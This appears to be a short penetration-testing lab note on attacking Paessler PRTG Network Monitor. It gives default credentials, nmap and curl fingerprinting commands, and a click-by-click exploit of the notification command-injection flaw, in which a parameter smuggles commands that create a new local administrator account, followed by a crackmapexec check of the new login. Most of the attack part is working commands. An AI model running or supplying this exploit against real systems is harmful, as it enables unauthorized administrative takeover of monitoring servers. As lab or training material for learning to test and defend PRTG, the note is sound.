26 vulnerabilities: https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html

Default credentials: prtgadmin:prtgadmin

## Discovery/Footprinting/Enumeration

```
sudo nmap -sV -p- --open -T4 10.129.201.50
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
- Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)


## Leveraging Known Vulnerabilities

1. Mouse over Setup
2. Account Settings
3. Notifications
4. Add new notification
5. Tick EXECUTE PROGRAM
6. Program File = Demo exe notification - outfile.ps1
7. Parameter =
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
9. Save
10. Click Test
```
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```
